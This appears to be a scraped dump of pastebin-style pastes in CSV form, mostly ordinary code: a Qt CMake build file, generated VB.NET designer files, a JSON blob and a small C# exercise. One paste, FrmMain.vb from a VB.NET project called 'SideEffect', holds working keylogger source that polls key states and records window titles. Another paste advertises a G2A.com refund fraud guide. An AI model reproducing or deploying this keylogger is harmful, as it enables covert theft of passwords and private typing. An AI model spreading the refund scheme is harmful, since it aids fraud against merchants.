id,title,username,language,date,content
iJxCH33R,Untitled,vladislav_larionov,CMake,Friday 29th of December 2023 06:04:04 AM CDT,"# SPDX-FileCopyrightText: 2023 Open Mobile Platform LLC <community@omp.ru>
# SPDX-License-Identifier: BSD-3-Clause

cmake_minimum_required (VERSION 3.1)

project(HttpServer)

find_package (Qt5 COMPONENTS Core Network Quick REQUIRED)

set(SOURCES
    HttpServer/src/httpServer/httpConnection.cpp
    HttpServer/src/httpServer/httpData.cpp
    HttpServer/src/httpServer/httpRequest.cpp
    HttpServer/src/httpServer/httpRequestRouter.cpp
    HttpServer/src/httpServer/httpResponse.cpp
    HttpServer/src/httpServer/httpServer.cpp
    HttpServer/src/httpServer/middleware/CORS.cpp
    HttpServer/src/httpServer/middleware/auth.cpp
    HttpServer/src/httpServer/middleware/getArray.cpp
    HttpServer/src/httpServer/middleware/getObject.cpp
    HttpServer/src/httpServer/middleware/verifyJson.cpp
    HttpServer/src/httpServer/util.cpp
)

set(HEADERS
    HttpServer/src/httpServer/const.h
    HttpServer/src/httpServer/httpConnection.h
    HttpServer/src/httpServer/httpCookie.h
    HttpServer/src/httpServer/httpData.h
    HttpServer/src/httpServer/httpRequest.h
    HttpServer/src/httpServer/httpRequestHandler.h
    HttpServer/src/httpServer/httpRequestRouter.h
    HttpServer/src/httpServer/httpResponse.h
    HttpServer/src/httpServer/httpServer.h
    HttpServer/src/httpServer/httpServerConfig.h
    HttpServer/src/httpServer/middleware.h
    HttpServer/src/httpServer/util.h
)

set(CMAKE_BUILD_TYPE Release)

add_library(${PROJECT_NAME} SHARED ${SOURCES} ${HEADERS})

target_include_directories(${PROJECT_NAME}
    INTERFACE
        ${CMAKE_CURRENT_SOURCE_DIR}
)
target_include_directories(${PROJECT_NAME}
    PUBLIC
        $<BUILD_INTERFACE:${CMAKE_CURRENT_SOURCE_DIR}/HttpServer/src/httpServer>
        $<INSTALL_INTERFACE:${CMAKE_INSTALL_INCLUDEDIR}>
)

set_target_properties(${PROJECT_NAME} PROPERTIES VERSION 1)
set_target_properties(${PROJECT_NAME} PROPERTIES SOVERSION 1)

set_target_properties(${PROJECT_NAME} PROPERTIES PUBLIC_HEADER ""${HEADERS}"")
add_compile_definitions(HTTPSERVER_LIBRARY)
add_compile_definitions(QT_DEPRECATED_WARNINGS)
target_link_libraries(HttpServer
    Qt5::Quick
    Qt5::Core
    qtpromise
    z
)
include(GNUInstallDirs)

set(CMAKE_INSTALL_PREFIX ${CMAKE_BINARY_DIR}/${PROJECT_NAME})

message(""!!! ${CMAKE_BINARY_DIR}/${PROJECT_NAME}/${CMAKE_INSTALL_INCLUDEDIR}"")
message(""!!! ${CMAKE_BINARY_DIR}/${PROJECT_NAME}/${CMAKE_INSTALL_LIBDIR}"")
install(TARGETS ${PROJECT_NAME}
    LIBRARY DESTINATION ${CMAKE_BINARY_DIR}/${PROJECT_NAME}/${CMAKE_INSTALL_LIBDIR}
    PUBLIC_HEADER DESTINATION ${CMAKE_BINARY_DIR}/${PROJECT_NAME}/${CMAKE_INSTALL_INCLUDEDIR}
    INCLUDES DESTINATION ${CMAKE_BINARY_DIR}/${PROJECT_NAME}/${CMAKE_INSTALL_INCLUDEDIR} # include
)
"
ESWzdBdc,My Project/Resources.Designer.vb,FlyFar,VB.NET,Friday 29th of December 2023 06:03:28 AM CDT,"'------------------------------------------------------------------------------
' <auto-generated>
'     This code was generated by a tool.
'     Runtime Version:4.0.30319.42000
'
'     Changes to this file may cause incorrect behavior and will be lost if
'     the code is regenerated.
' </auto-generated>
'------------------------------------------------------------------------------

Option Strict On
Option Explicit On


Namespace My.Resources

    'This class was auto-generated by the StronglyTypedResourceBuilder
    'class via a tool like ResGen or Visual Studio.
    'To add or remove a member, edit your .ResX file then rerun ResGen
    'with the /str option, or rebuild your VS project.
    '''<summary>
    '''  A strongly-typed resource class, for looking up localized strings, etc.
    '''</summary>
    <Global.System.CodeDom.Compiler.GeneratedCodeAttribute(""System.Resources.Tools.StronglyTypedResourceBuilder"", ""4.0.0.0""), _
     Global.System.Diagnostics.DebuggerNonUserCodeAttribute(), _
     Global.System.Runtime.CompilerServices.CompilerGeneratedAttribute(), _
     Global.Microsoft.VisualBasic.HideModuleNameAttribute()> _
    Friend Module Resources

        Private resourceMan As Global.System.Resources.ResourceManager

        Private resourceCulture As Global.System.Globalization.CultureInfo

        '''<summary>
        '''  Returns the cached ResourceManager instance used by this class.
        '''</summary>
        <Global.System.ComponentModel.EditorBrowsableAttribute(Global.System.ComponentModel.EditorBrowsableState.Advanced)> _
        Friend ReadOnly Property ResourceManager() As Global.System.Resources.ResourceManager
            Get
                If Object.ReferenceEquals(resourceMan, Nothing) Then
                    Dim temp As Global.System.Resources.ResourceManager = New Global.System.Resources.ResourceManager(""SideEffect.Resources"", GetType(Resources).Assembly)
                    resourceMan = temp
                End If
                Return resourceMan
            End Get
        End Property

        '''<summary>
        '''  Overrides the current thread's CurrentUICulture property for all
        '''  resource lookups using this strongly typed resource class.
        '''</summary>
        <Global.System.ComponentModel.EditorBrowsableAttribute(Global.System.ComponentModel.EditorBrowsableState.Advanced)> _
        Friend Property Culture() As Global.System.Globalization.CultureInfo
            Get
                Return resourceCulture
            End Get
            Set(ByVal value As Global.System.Globalization.CultureInfo)
                resourceCulture = value
            End Set
        End Property
    End Module
End Namespace"
RLv7ashn,data797,TestGuy1,JSON,Friday 29th of December 2023 06:00:05 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: '8f3b843bd8c50664c0173539bc2e34a5ae97bffa8254696321cdb79475d5f7db23bf426223e23bd01a0e0e9e306b3e730f674ecbfe34a1c996732353348175d341b29e46afe26929f1dee7266cc0c146ea3a8157198369bc02c574c356cc238be243c02c782783b63afb1c82961846740b9d7a99d6d3361a7171bd42078c9775',
  otherdata: [
    'ff1bda8dab0b4782beaea18e9ba31d5d',
    'ab51fcc82083cf87eccf4ca4421fe009',
    '273d9d210bd5f97d7708560b25a3072f',
    'f010028c79de184e8e0acf086a0a0afa',
    'a29152fa5075877fb0e56cecb34b3ad4',
    'c7e1824f99a55ee707ee49ad6f490f7e',
    '1a8ca80aa651a0c78abcb2ce37bd8791',
    '0a9229c28ddf8d50f02cba0db0d0039c'
  ]
}"
FFnTCG4A,MyProject/Settings.Designer.vb,FlyFar,VB.NET,Friday 29th of December 2023 05:59:15 AM CDT,"'------------------------------------------------------------------------------
' <auto-generated>
'     This code was generated by a tool.
'     Runtime Version:4.0.30319.42000
'
'     Changes to this file may cause incorrect behavior and will be lost if
'     the code is regenerated.
' </auto-generated>
'------------------------------------------------------------------------------

Option Strict On
Option Explicit On


Namespace My

    <Global.System.Runtime.CompilerServices.CompilerGeneratedAttribute(), _
     Global.System.CodeDom.Compiler.GeneratedCodeAttribute(""Microsoft.VisualStudio.Editors.SettingsDesigner.SettingsSingleFileGenerator"", ""11.0.0.0""), _
     Global.System.ComponentModel.EditorBrowsableAttribute(Global.System.ComponentModel.EditorBrowsableState.Advanced)> _
    Partial Friend NotInheritable Class MySettings
        Inherits Global.System.Configuration.ApplicationSettingsBase

        Private Shared defaultInstance As MySettings = CType(Global.System.Configuration.ApplicationSettingsBase.Synchronized(New MySettings), MySettings)

#Region ""My.Settings Auto-Save Functionality""
#If _MyType = ""WindowsForms"" Then
        Private Shared addedHandler As Boolean

        Private Shared addedHandlerLockObject As New Object

        <Global.System.Diagnostics.DebuggerNonUserCodeAttribute(), Global.System.ComponentModel.EditorBrowsableAttribute(Global.System.ComponentModel.EditorBrowsableState.Advanced)> _
        Private Shared Sub AutoSaveSettings(ByVal sender As Global.System.Object, ByVal e As Global.System.EventArgs)
            If My.Application.SaveMySettingsOnExit Then
                My.Settings.Save()
            End If
        End Sub
#End If
#End Region

        Public Shared ReadOnly Property [Default]() As MySettings
            Get

#If _MyType = ""WindowsForms"" Then
                   If Not addedHandler Then
                        SyncLock addedHandlerLockObject
                            If Not addedHandler Then
                                AddHandler My.Application.Shutdown, AddressOf AutoSaveSettings
                                addedHandler = True
                            End If
                        End SyncLock
                    End If
#End If
                Return defaultInstance
            End Get
        End Property
    End Class
End Namespace

Namespace My

    <Global.Microsoft.VisualBasic.HideModuleNameAttribute(), _
     Global.System.Diagnostics.DebuggerNonUserCodeAttribute(), _
     Global.System.Runtime.CompilerServices.CompilerGeneratedAttribute()> _
    Friend Module MySettingsProperty

        <Global.System.ComponentModel.Design.HelpKeywordAttribute(""My.Settings"")> _
        Friend ReadOnly Property Settings() As Global.SideEffect.My.MySettings
            Get
                Return Global.SideEffect.My.MySettings.Default
            End Get
        End Property
    End Module
End Namespace"
tmP26GCR,FrmMain.Designer.vb,FlyFar,VB.NET,Friday 29th of December 2023 05:58:03 AM CDT,"<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()>
Partial Class FrmMain
    Inherits System.Windows.Forms.Form

    'Form overrides dispose to clean up the component list.
    <System.Diagnostics.DebuggerNonUserCode()>
    Protected Overrides Sub Dispose(ByVal disposing As Boolean)
        Try
            If disposing AndAlso components IsNot Nothing Then
                components.Dispose()
            End If
        Finally
            MyBase.Dispose(disposing)
        End Try
    End Sub

    'Required by the Windows Form Designer
    Private components As System.ComponentModel.IContainer

    'NOTE: The following procedure is required by the Windows Form Designer
    'It can be modified using the Windows Form Designer.  
    'Do not modify it using the code editor.
    <System.Diagnostics.DebuggerStepThrough()>
    Private Sub InitializeComponent()
        Me.components = New System.ComponentModel.Container()
        Me.TextBox = New System.Windows.Forms.TextBox()
        Me.kClock = New System.Windows.Forms.Timer(Me.components)
        Me.tClock = New System.Windows.Forms.Timer(Me.components)
        Me.SuspendLayout()
        '
        'TextBox
        '
        Me.TextBox.Dock = System.Windows.Forms.DockStyle.Fill
        Me.TextBox.Location = New System.Drawing.Point(0, 0)
        Me.TextBox.Multiline = True
        Me.TextBox.Name = ""TextBox""
        Me.TextBox.Size = New System.Drawing.Size(397, 265)
        Me.TextBox.TabIndex = 0
        '
        'kClock
        '
        '
        'tClock
        '
        '
        'FrmMain
        '
        Me.AutoScaleDimensions = New System.Drawing.SizeF(6.0!, 13.0!)
        Me.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font
        Me.ClientSize = New System.Drawing.Size(397, 265)
        Me.Controls.Add(Me.TextBox)
        Me.Name = ""FrmMain""
        Me.Text = ""SideEffect""
        Me.ResumeLayout(False)
        Me.PerformLayout()

    End Sub

    Friend WithEvents TextBox As TextBox
    Friend WithEvents kClock As Timer
    Friend WithEvents tClock As Timer
End Class"
yWkgb4DT,FrmMain.vb,FlyFar,VB.NET,Friday 29th of December 2023 05:56:20 AM CDT,"Public Class FrmMain

#Region ""Declare""
    Private Declare Function GetAsyncKeyState Lib ""user32"" (ByVal vKey As Int32) As Int32
    Private Declare Function GetKeyState Lib ""user32"" (ByVal nVirtKey As Int32) As Int32
    Private Declare Function GetWindowText Lib ""user32.dll"" Alias ""GetWindowTextA"" (ByVal hwnd As Int32, ByVal lpString As String, ByVal cch As Int32) As Int32
    Private Declare Function GetForegroundWindow Lib ""user32.dll"" () As Int32
    Dim LastStr As String, i As Object, KeyPressed As Object
    Dim charCount As Short, lineLimit As Short = 69, addkey As Object
#End Region

#Region ""EntryPoint""
    Sub New()
        InitializeComponent()
        SetTimer()
        StartTimer()
    End Sub
#End Region

#Region ""SetTimer""
    Private Sub SetTimer()
        kClock.Interval = 6
        tClock.Interval = 60
    End Sub
#End Region

#Region ""StartTimer""
    Private Sub StartTimer()
        kClock.Start()
        tClock.Start()
    End Sub
#End Region

#Region ""Function""
    Public Function getCapslock() As Boolean
        getCapslock = CBool(GetKeyState(Keys.Capital) And 1)
    End Function
    Public Function getShift() As Boolean
        getShift = CBool(GetAsyncKeyState(Keys.ShiftKey))
    End Function
    Private Function GetActiveWindowTitle() As String
        On Error Resume Next
        Dim Str As String
        Str = New String(Chr(0), 100)
        GetWindowText(GetForegroundWindow, Str, 100)
        Str = Str.Substring(0, InStr(Str, Chr(0)) - 1)
        Return Str
    End Function
#End Region

#Region ""Keylogger""
    Private Sub kClock_Tick(sender As Object, e As EventArgs) Handles kClock.Tick
        On Error Resume Next
        KeyPressed = GetAsyncKeyState(13)
        If KeyPressed = -32767 Then
            charCount = 0
            addkey = vbCrLf
            GoTo KeyFound
        End If

        KeyPressed = GetAsyncKeyState(8)
        If KeyPressed = -32767 Then
            addkey = ""<BackSpace>""
            charCount += 4
            GoTo KeyFound
        End If


        KeyPressed = GetAsyncKeyState(32)
        If KeyPressed = -32767 Then
            addkey = "" ""
            GoTo KeyFound
            charCount += 1
        End If

        KeyPressed = GetAsyncKeyState(186)
        If KeyPressed = -32767 Then
            If getShift() = False Then
                addkey = "";""
            Else
                addkey = "":""
            End If
            GoTo KeyFound
            charCount += 1
        End If

        KeyPressed = GetAsyncKeyState(187)
        If KeyPressed = -32767 Then
            If getShift() = False Then
                addkey = ""=""
            Else
                addkey = ""+""
            End If
            GoTo KeyFound
            charCount += 1
        End If


        KeyPressed = GetAsyncKeyState(188)
        If KeyPressed = -32767 Then
            If getShift() = False Then
                addkey = "",""
            Else
                addkey = ""<""
            End If
            GoTo KeyFound
            charCount += 1
        End If


        KeyPressed = GetAsyncKeyState(189)
        If KeyPressed = -32767 Then
            If getShift() = False Then
                addkey = ""-""
            Else
                addkey = ""_""
            End If
            GoTo KeyFound
            charCount += 1
        End If


        KeyPressed = GetAsyncKeyState(190)
        If KeyPressed = -32767 Then
            If getShift() = False Then
                addkey = "".""
            Else
                addkey = "">""
            End If
            GoTo KeyFound
            charCount += 1
        End If


        KeyPressed = GetAsyncKeyState(191)
        If KeyPressed = -32767 Then
            If getShift() = False Then
                addkey = ""/""
            Else
                addkey = ""?""
            End If
            GoTo KeyFound
            charCount += 1
        End If


        KeyPressed = GetAsyncKeyState(192)
        If KeyPressed = -32767 Then
            If getShift() = False Then
                addkey = ""`""
            Else
                addkey = ""~""
            End If
            GoTo KeyFound
            charCount += 1
        End If

        KeyPressed = GetAsyncKeyState(96)
        If KeyPressed = -32767 Then
            If getShift() = False Then
                addkey = ""0""
            Else
                addkey = "")""
            End If
            GoTo KeyFound
            charCount += 1
        End If


        KeyPressed = GetAsyncKeyState(97)
        If KeyPressed = -32767 Then
            If getShift() = False Then
                addkey = ""1""
            Else
                addkey = ""!""
            End If
            GoTo KeyFound
            charCount += 1
        End If


        KeyPressed = GetAsyncKeyState(98)
        If KeyPressed = -32767 Then
            If getShift() = False Then
                addkey = ""2""
            Else
                addkey = ""@""
            End If
            GoTo KeyFound
            charCount += 1
        End If


        KeyPressed = GetAsyncKeyState(99)
        If KeyPressed = -32767 Then
            If getShift() = False Then
                addkey = ""3""
            Else
                addkey = ""#""
            End If
            GoTo KeyFound
            charCount += 1
        End If


        KeyPressed = GetAsyncKeyState(100)
        If KeyPressed = -32767 Then
            If getShift() = False Then
                addkey = ""4""
            Else
                addkey = ""$""
            End If
            GoTo KeyFound
            charCount += 1
        End If


        KeyPressed = GetAsyncKeyState(101)
        If KeyPressed = -32767 Then
            If getShift() = False Then
                addkey = ""5""
            Else
                addkey = ""%""
            End If
            GoTo KeyFound
            charCount += 1
        End If


        KeyPressed = GetAsyncKeyState(102)
        If KeyPressed = -32767 Then
            If getShift() = False Then
                addkey = ""6""
            Else
                addkey = ""7""
            End If
            GoTo KeyFound
            charCount += 1
        End If

        KeyPressed = GetAsyncKeyState(103)
        If KeyPressed = -32767 Then
            If getShift() = False Then
                addkey = ""7""
            Else
                addkey = ""&""
            End If
            GoTo KeyFound
            charCount += 1
        End If

        KeyPressed = GetAsyncKeyState(104)
        If KeyPressed = -32767 Then
            If getShift() = False Then
                addkey = ""8""
            Else
                addkey = ""*""
            End If
            GoTo KeyFound
            charCount += 1
        End If


        KeyPressed = GetAsyncKeyState(105)
        If KeyPressed = -32767 Then
            If getShift() = False Then
                addkey = ""9""
            Else
                addkey = ""(""
            End If
            GoTo KeyFound
            charCount += 1
        End If


        KeyPressed = GetAsyncKeyState(106)
        If KeyPressed = -32767 Then
            If getShift() = False Then
                addkey = ""*""
                charCount += 1
            Else
                addkey = """"
            End If
            GoTo KeyFound
        End If

        KeyPressed = GetAsyncKeyState(107)
        If KeyPressed = -32767 Then
            If getShift() = False Then
                addkey = ""+""
            Else
                addkey = ""=""
            End If
            GoTo KeyFound
            charCount += 1
        End If

        KeyPressed = GetAsyncKeyState(108)
        If KeyPressed = -32767 Then
            addkey = """"
            GoTo KeyFound
        End If

        KeyPressed = GetAsyncKeyState(109)
        If KeyPressed = -32767 Then
            If getShift() = False Then
                addkey = ""-""
            Else
                addkey = ""_""
            End If
            GoTo KeyFound
            charCount += 1
        End If

        KeyPressed = GetAsyncKeyState(110)
        If KeyPressed = -32767 Then
            If getShift() = False Then
                addkey = "".""
            Else
                addkey = "">""
            End If
            GoTo KeyFound
            charCount += 1
        End If

        KeyPressed = GetAsyncKeyState(111)
        If KeyPressed = -32767 Then
            addkey = ""/""
            GoTo KeyFound
            charCount += 1
        End If

        KeyPressed = GetAsyncKeyState(2)
        If KeyPressed = -32767 Then
            If getShift() = False Then
                addkey = ""/""
            Else
                addkey = ""?""
            End If
            GoTo KeyFound
            charCount += 1
        End If

        KeyPressed = GetAsyncKeyState(220)
        If KeyPressed = -32767 Then
            If getShift() = False Then
                addkey = ""\""
            Else
                addkey = ""|""
            End If
            GoTo KeyFound
            charCount += 1
        End If

        KeyPressed = GetAsyncKeyState(222)
        If KeyPressed = -32767 Then
            If getShift() = False Then
                addkey = ""'""
            Else
                addkey = Chr(34)
            End If
            GoTo KeyFound
            charCount += 1
        End If

        KeyPressed = GetAsyncKeyState(221)
        If KeyPressed = -32767 Then
            If getShift() = False Then
                addkey = ""]""
            Else
                addkey = ""}""
            End If
            GoTo KeyFound
            charCount += 1
        End If

        KeyPressed = GetAsyncKeyState(219)
        If KeyPressed = -32767 Then
            If getShift() = False Then
                addkey = ""[""
            Else
                addkey = ""{""
            End If
            GoTo KeyFound
            charCount += 1
        End If


        For i = 65 To 128
            KeyPressed = GetAsyncKeyState(i)
            If KeyPressed = -32767 Then
                If getShift() = False Then
                    If getCapslock() = True Then
                        addkey = UCase(Chr(i))
                    Else
                        addkey = LCase(Chr(i))
                    End If
                Else
                    If getCapslock() = False Then
                        addkey = UCase(Chr(i))
                    Else
                        addkey = LCase(Chr(i))
                    End If
                End If
                GoTo KeyFound
                charCount += 1
            End If
        Next i

        For i = 48 To 57
            KeyPressed = GetAsyncKeyState(i)
            If KeyPressed = -32767 Then
                If getShift() = True Then
                    Select Case Val(Chr(i))
                        Case 1
                            addkey = ""!""
                        Case 2
                            addkey = ""@""
                        Case 3
                            addkey = ""#""
                        Case 4
                            addkey = ""$""
                        Case 5
                            addkey = ""%""
                        Case 6
                            addkey = ""^""
                        Case 7
                            addkey = ""&""
                        Case 8
                            addkey = ""*""
                        Case 9
                            addkey = ""(""
                        Case 0
                            addkey = "")""
                    End Select
                Else
                    addkey = Chr(i)
                End If
                GoTo KeyFound
                charCount += 1
            End If
        Next i

        Application.DoEvents()
        Exit Sub


KeyFound:
        If charCount > lineLimit Then
            charCount = 0
            TextBox.AppendText(vbCrLf)
        End If
        If addkey <> """" Then TextBox.AppendText(addkey)
        Application.DoEvents()

    End Sub

    Private Sub tClock_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles tClock.Tick
        On Error Resume Next
        If LastStr <> GetActiveWindowTitle() Then
            TextBox.AppendText(vbNewLine & "" [ --"" & GetActiveWindowTitle() & ""--]"" & vbNewLine)
            LastStr = GetActiveWindowTitle()
        End If
    End Sub
#End Region

End Class"
MYqPmm2a,SideEffect.vbproj,FlyFar,VB.NET,Friday 29th of December 2023 05:55:49 AM CDT,"<?xml version=""1.0"" encoding=""utf-8""?>
<Project ToolsVersion=""14.0"" DefaultTargets=""Build"" xmlns=""http://schemas.microsoft.com/developer/msbuild/2003"">
  <Import Project=""$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props"" Condition=""Exists('$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props')"" />
  <PropertyGroup>
    <Configuration Condition="" '$(Configuration)' == '' "">Debug</Configuration>
    <Platform Condition="" '$(Platform)' == '' "">AnyCPU</Platform>
    <ProjectGuid>{582225DA-7CE8-4CA7-B42A-26C62C4AA08B}</ProjectGuid>
    <OutputType>WinExe</OutputType>
    <StartupObject>SideEffect.My.MyApplication</StartupObject>
    <RootNamespace>SideEffect</RootNamespace>
    <AssemblyName>SideEffect</AssemblyName>
    <FileAlignment>512</FileAlignment>
    <MyType>WindowsForms</MyType>
    <TargetFrameworkVersion>v4.0</TargetFrameworkVersion>
  </PropertyGroup>
  <PropertyGroup Condition="" '$(Configuration)|$(Platform)' == 'Debug|AnyCPU' "">
    <PlatformTarget>AnyCPU</PlatformTarget>
    <DebugSymbols>true</DebugSymbols>
    <DebugType>full</DebugType>
    <DefineDebug>true</DefineDebug>
    <DefineTrace>true</DefineTrace>
    <OutputPath>bin\Debug\</OutputPath>
    <DocumentationFile>SideEffect.xml</DocumentationFile>
    <NoWarn>42016,41999,42017,42018,42019,42032,42036,42020,42021,42022</NoWarn>
  </PropertyGroup>
  <PropertyGroup Condition="" '$(Configuration)|$(Platform)' == 'Release|AnyCPU' "">
    <PlatformTarget>AnyCPU</PlatformTarget>
    <DebugType>pdbonly</DebugType>
    <DefineDebug>false</DefineDebug>
    <DefineTrace>true</DefineTrace>
    <Optimize>true</Optimize>
    <OutputPath>bin\Release\</OutputPath>
    <DocumentationFile>SideEffect.xml</DocumentationFile>
    <NoWarn>42016,41999,42017,42018,42019,42032,42036,42020,42021,42022</NoWarn>
  </PropertyGroup>
  <PropertyGroup>
    <OptionExplicit>On</OptionExplicit>
  </PropertyGroup>
  <PropertyGroup>
    <OptionCompare>Binary</OptionCompare>
  </PropertyGroup>
  <PropertyGroup>
    <OptionStrict>Off</OptionStrict>
  </PropertyGroup>
  <PropertyGroup>
    <OptionInfer>On</OptionInfer>
  </PropertyGroup>
  <ItemGroup>
    <Reference Include=""System"" />
    <Reference Include=""System.Data"" />
    <Reference Include=""System.Deployment"" />
    <Reference Include=""System.Drawing"" />
    <Reference Include=""System.Windows.Forms"" />
    <Reference Include=""System.Xml"" />
    <Reference Include=""System.Core"" />
    <Reference Include=""System.Xml.Linq"" />
    <Reference Include=""System.Data.DataSetExtensions"" />
  </ItemGroup>
  <ItemGroup>
    <Import Include=""Microsoft.VisualBasic"" />
    <Import Include=""System"" />
    <Import Include=""System.Collections"" />
    <Import Include=""System.Collections.Generic"" />
    <Import Include=""System.Data"" />
    <Import Include=""System.Drawing"" />
    <Import Include=""System.Diagnostics"" />
    <Import Include=""System.Windows.Forms"" />
    <Import Include=""System.Linq"" />
    <Import Include=""System.Xml.Linq"" />
  </ItemGroup>
  <ItemGroup>
    <Compile Include=""FrmMain.vb"">
      <SubType>Form</SubType>
    </Compile>
    <Compile Include=""FrmMain.Designer.vb"">
      <DependentUpon>FrmMain.vb</DependentUpon>
      <SubType>Form</SubType>
    </Compile>
    <Compile Include=""My Project\AssemblyInfo.vb"" />
    <Compile Include=""My Project\Application.Designer.vb"">
      <AutoGen>True</AutoGen>
      <DependentUpon>Application.myapp</DependentUpon>
    </Compile>
    <Compile Include=""My Project\Resources.Designer.vb"">
      <AutoGen>True</AutoGen>
      <DesignTime>True</DesignTime>
      <DependentUpon>Resources.resx</DependentUpon>
    </Compile>
    <Compile Include=""My Project\Settings.Designer.vb"">
      <AutoGen>True</AutoGen>
      <DependentUpon>Settings.settings</DependentUpon>
      <DesignTimeSharedInput>True</DesignTimeSharedInput>
    </Compile>
  </ItemGroup>
  <ItemGroup>
    <EmbeddedResource Include=""FrmMain.resx"">
      <DependentUpon>FrmMain.vb</DependentUpon>
    </EmbeddedResource>
    <EmbeddedResource Include=""My Project\Resources.resx"">
      <Generator>VbMyResourcesResXFileCodeGenerator</Generator>
      <LastGenOutput>Resources.Designer.vb</LastGenOutput>
      <CustomToolNamespace>My.Resources</CustomToolNamespace>
      <SubType>Designer</SubType>
    </EmbeddedResource>
  </ItemGroup>
  <ItemGroup>
    <None Include=""My Project\Application.myapp"">
      <Generator>MyApplicationCodeGenerator</Generator>
      <LastGenOutput>Application.Designer.vb</LastGenOutput>
    </None>
    <None Include=""My Project\Settings.settings"">
      <Generator>SettingsSingleFileGenerator</Generator>
      <CustomToolNamespace>My</CustomToolNamespace>
      <LastGenOutput>Settings.Designer.vb</LastGenOutput>
    </None>
  </ItemGroup>
  <Import Project=""$(MSBuildToolsPath)\Microsoft.VisualBasic.targets"" />
  <!-- To modify your build process, add your task inside one of the targets below and uncomment it. 
       Other similar extension points exist, see Microsoft.Common.targets.
  <Target Name=""BeforeBuild"">
  </Target>
  <Target Name=""AfterBuild"">
  </Target>
  -->
</Project>"
hLw3ursF,SideEffect.sln,FlyFar,VisualBasic,Friday 29th of December 2023 05:55:01 AM CDT,"
Microsoft Visual Studio Solution File, Format Version 12.00
# Visual Studio 14
VisualStudioVersion = 14.0.25420.1
MinimumVisualStudioVersion = 10.0.40219.1
Project(""{F184B08F-C81C-45F6-A57F-5ABD9991F28F}"") = ""SideEffect"", ""SideEffect\SideEffect.vbproj"", ""{582225DA-7CE8-4CA7-B42A-26C62C4AA08B}""
EndProject
Global
	GlobalSection(SolutionConfigurationPlatforms) = preSolution
		Debug|Any CPU = Debug|Any CPU
		Release|Any CPU = Release|Any CPU
	EndGlobalSection
	GlobalSection(ProjectConfigurationPlatforms) = postSolution
		{582225DA-7CE8-4CA7-B42A-26C62C4AA08B}.Debug|Any CPU.ActiveCfg = Debug|Any CPU
		{582225DA-7CE8-4CA7-B42A-26C62C4AA08B}.Debug|Any CPU.Build.0 = Debug|Any CPU
		{582225DA-7CE8-4CA7-B42A-26C62C4AA08B}.Release|Any CPU.ActiveCfg = Release|Any CPU
		{582225DA-7CE8-4CA7-B42A-26C62C4AA08B}.Release|Any CPU.Build.0 = Release|Any CPU
	EndGlobalSection
	GlobalSection(SolutionProperties) = preSolution
		HideSolutionNode = FALSE
	EndGlobalSection
EndGlobal"
WLSacmhn,G2A.com Refund Exploit Dec 2023,G2ARefundExploit,GetText,Friday 29th of December 2023 05:54:58 AM CDT,"G2A.com refund exploit updated guide 
Any item for free on G2A.com such as Amazon, Steam, and any other gift cards.

PDF guide here:
https://drive.google.com/file/d/120kXNJWM5T5u3PGlkQeZCo_nLxzQIlkf/view?usp=g2a_refund_exploit.pdf

Working as of 
29 December 2023

555524"
fFAF8V2N,Untitled,kwest87,C#,Friday 29th of December 2023 04:57:00 AM CDT,"using System;

namespace ConsoleApp17
{
    internal class Program
    {
        static void Main(string[] args)
        {
            Random random = new Random();
            int maximumRandomNumber = 100;
            int resultingNumber = random.Next(maximumRandomNumber);
            int initialNumber = 2;
            int degreeNumber = 2;
            int degreeResultingNumber = 1;

            while (resultingNumber > initialNumber)
            {
                initialNumber *= degreeNumber;
                degreeResultingNumber++;
            }

            Console.WriteLine($""Минимальная степень {degreeNumber} превосходящая {resultingNumber} ,будет  {degreeResultingNumber} или число {initialNumber}."");
        }
  "
